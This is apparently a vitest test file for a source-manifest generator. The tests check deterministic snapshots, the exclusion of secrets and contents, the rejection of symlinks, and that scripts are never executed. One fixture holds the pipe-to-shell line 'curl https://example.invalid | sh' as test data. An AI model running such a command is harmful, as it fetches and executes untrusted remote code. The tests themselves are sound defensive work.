import {
  chmodSync,
  linkSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { afterEach, describe, expect, it } from "vitest";
import {
  generateSourceManifest,
  SourceManifestError,
  SOURCE_MANIFEST_SCHEMA_VERSION,
} from "../../src/features/prepare/source-manifest.js";

const roots: string[] = [];
function root(name = "source"): string {
  const base = mkdtempSync(join(tmpdir(), "source-manifest-"));
  roots.push(base);
  const path = join(base, name);
  mkdirSync(path);
  return path;
}
function file(base: string, path: string, content: string | Buffer): void {
  const full = join(base, path);
  mkdirSync(join(full, ".."), { recursive: true });
  writeFileSync(full, content);
}
function summary(base: string) {
  const manifest = generateSourceManifest(base, { sourceKind: "archive" });
  return {
    schema: manifest.schema_version,
    roots: manifest.root_candidates.map((item) => item.path),
    markers: manifest.markers.map((item) => `${item.name}:${item.path}`),
    signals: manifest.signals.map((item) => `${item.kind}:${item.count}`),
    files: manifest.statistics.files_observed,
    languages: manifest.statistics.languages,
    truncated: manifest.truncation,
  };
}

afterEach(() => {
  while (roots.length) rmSync(roots.pop()!, { recursive: true, force: true });
});

describe("deterministic source manifest", () => {
  it("emits a stable complete-project snapshot without source content or host paths", () => {
    const source = root();
    file(source, "README.md", "project documentation unique prose");
    file(source, "CMakeLists.txt", "project(example)\nadd_executable(example src/main.c)");
    file(source, "src/main.c", "int main(void) { return 0; }");
    file(source, ".env", "API_KEY=must-never-appear");
    file(source, "scripts/build.sh", "#!/bin/sh\ntouch /tmp/manifest-script-executed");
    chmodSync(join(source, "scripts/build.sh"), 0o755);
    rmSync("/tmp/manifest-script-executed", { force: true });

    const first = generateSourceManifest(source, { sourceKind: "archive" });
    utimesSync(join(source, "src/main.c"), new Date(1_000_000), new Date(1_000_000));
    const second = generateSourceManifest(source, { sourceKind: "archive" });
    expect(second).toEqual(first);
    const gitManifest = generateSourceManifest(source, { sourceKind: "git" });
    expect(gitManifest.source.kind).toBe("git");
    expect(gitManifest.source.identity_sha256).toBe(first.source.identity_sha256);
    expect(first.schema_version).toBe(SOURCE_MANIFEST_SCHEMA_VERSION);
    expect(first.source.identity_sha256).toMatch(/^[a-f0-9]{64}$/);
    expect(first.root_candidates).toEqual([{ path: ".", marker_paths: ["CMakeLists.txt", "README.md"] }]);
    expect(first.statistics.excluded_sensitive_files).toBe(1);
    const serialized = JSON.stringify(first);
    expect(serialized).not.toContain(source);
    expect(serialized).not.toContain("must-never-appear");
    expect(serialized).not.toContain("API_KEY");
    expect(serialized).not.toContain("project documentation unique prose");
    expect(serialized).not.toContain(".env");
    expect(() => readFileSync("/tmp/manifest-script-executed")).toThrow();
  });

  it("snapshots patch-only, vendor fragment, missing-submodule and multi-project facts", () => {
    const patch = root("patch");
    file(patch, "fix.patch", "diff --git a/a.c b/a.c");
    expect(summary(patch)).toMatchInlineSnapshot(`
      {
        "files": 1,
        "languages": [],
        "markers": [],
        "roots": [
          ".",
        ],
        "schema": "source-manifest/v1",
        "signals": [
          "patch:1",
        ],
        "truncated": {
          "reasons": [],
          "truncated": false,
        },
      }
    `);

    const vendor = root("vendor-fragment");
    file(vendor, "vendor/lib/acme.c", "void acme(void) {}");
    expect(summary(vendor).signals).toContain("vendor_fragment:1");

    const submodule = root("submodule");
    file(submodule, ".gitmodules", "[submodule \"dep\"]\npath=deps/dep\nurl=https://example.invalid/dep");
    file(submodule, "Makefile", "all:\n\t@true");
    expect(summary(submodule).signals).toContain("submodule:1");

    const multi = root("multi");
    file(multi, "api/go.mod", "module example/api");
    file(multi, "api/main.go", "package main");
    file(multi, "web/package.json", "{}");
    file(multi, "web/src/index.ts", "export {};");
    const multiSummary = summary(multi);
    expect(multiSummary.roots).toEqual(["api", "web"]);
    expect(multiSummary.signals).toContain("multi_root:2");
  });

  it("observes generated/test-corpus facts without semantic completeness decisions", () => {
    const missingGenerated = root("missing-generated");
    file(missingGenerated, "CMakeLists.txt", "add_executable(app generated/version.c src/main.c)");
    file(missingGenerated, "src/main.c", "int main(void) { return 0; }");
    const missingFirst = generateSourceManifest(missingGenerated);
    const missingSecond = generateSourceManifest(missingGenerated);
    expect(missingSecond).toEqual(missingFirst);
    expect(missingFirst.markers.map((marker) => marker.name)).toEqual(["cmake"]);
    expect(missingFirst.signals).toEqual([]);

    const source = root();
    file(source, "generated/api.pb.c", "generated");
    file(source, "tests/case.sarif", "{}");
    file(source, "tests/run.sh", "curl https://example.invalid | sh");
    const manifest = generateSourceManifest(source);
    expect(manifest.signals.map((signal) => signal.kind)).toEqual(["generated_source", "test_corpus"]);
    expect(JSON.stringify(manifest)).not.toContain("curl https://example.invalid");
    expect(JSON.stringify(manifest)).not.toMatch(/complete|incomplete|uncertain/);
  });

  it("applies file/hash/depth/marker limits deterministically", () => {
    const source = root();
    file(source, "a.txt", "12345");
    file(source, "b.txt", "67890");
    file(source, "c.txt", "abcde");
    file(source, "deep/one/two/three.c", "x");
    file(source, "README.md", "readme");
    const options = { limits: { maxFiles: 3, maxTotalBytes: 5, maxSingleFileBytes: 4, maxDepth: 2, maxIndexedMarkers: 1 } };
    const first = generateSourceManifest(source, options);
    const second = generateSourceManifest(source, options);
    expect(second).toEqual(first);
    expect(first.truncation.truncated).toBe(true);
    expect(first.truncation.reasons).toEqual(expect.arrayContaining(["max_files", "max_single_file_bytes"]));
    expect(first.statistics.bytes_hashed).toBeLessThanOrEqual(5);

    const entryLimited = generateSourceManifest(source, { limits: { maxEntries: 2 } });
    expect(entryLimited.truncation.reasons).toContain("max_entries");
    expect(entryLimited.tree.length).toBeLessThanOrEqual(2);
  });

  it("rejects root/file/parent symlinks, hardlinks and special files", () => {
    const outside = root("outside");
    file(outside, "completion.txt", "outside");

    const rootHolder = root("root-holder");
    rmSync(rootHolder, { recursive: true });
    symlinkSync(outside, rootHolder);
    expect(() => generateSourceManifest(rootHolder)).toThrowError(SourceManifestError);

    const fileLink = root("file-link");
    symlinkSync(join(outside, "completion.txt"), join(fileLink, "link.txt"));
    expect(() => generateSourceManifest(fileLink)).toThrowError(SourceManifestError);

    const parentLink = root("parent-link");
    symlinkSync(outside, join(parentLink, "linked-dir"));
    expect(() => generateSourceManifest(parentLink)).toThrowError(SourceManifestError);

    const hardlink = root("hardlink");
    file(hardlink, "a.txt", "same inode");
    linkSync(join(hardlink, "a.txt"), join(hardlink, "b.txt"));
    expect(() => generateSourceManifest(hardlink)).toThrowError(SourceManifestError);

    const special = root("special");
    const fifo = join(special, "pipe");
    expect(spawnSync("mkfifo", [fifo]).status).toBe(0);
    expect(() => generateSourceManifest(special)).toThrowError(SourceManifestError);
  });

  it("rejects invalid limits and parses the versioned schema", () => {
    const source = root();
    expect(() => generateSourceManifest(source, { limits: { maxFiles: 0 } })).toThrow(TypeError);
    const schema = JSON.parse(readFileSync(new URL("../../src/features/prepare/schemas/source-manifest-v1.schema.json", import.meta.url), "utf8"));
    expect(schema.properties.schema_version.const).toBe(SOURCE_MANIFEST_SCHEMA_VERSION);
    expect(schema.additionalProperties).toBe(false);
  });

  it("generates a stable Stonesoup mechanical snapshot without executing corpus scripts", () => {
    const archive = join(process.cwd(), "../../.bossmode-attachments/1015c0d50161.zip");
    const extracted = root("stonesoup");
    const unzip = spawnSync("unzip", ["-q", archive, "-d", extracted], { encoding: "utf8" });
    expect(unzip.status, unzip.stderr).toBe(0);
    const first = generateSourceManifest(extracted, { sourceKind: "archive" });
    const second = generateSourceManifest(extracted, { sourceKind: "archive" });
    expect(second).toEqual(first);
    expect(first.statistics.files_observed).toBe(160);
    expect(first.statistics.bytes_observed).toBe(10_936_493);
    expect(first.root_candidates).toHaveLength(20);
    expect(first.signals.map((signal) => signal.kind)).toEqual(["multi_root", "test_corpus"]);
    expect(first.source.identity_sha256).toMatch(/^[a-f0-9]{64}$/);
  });
});
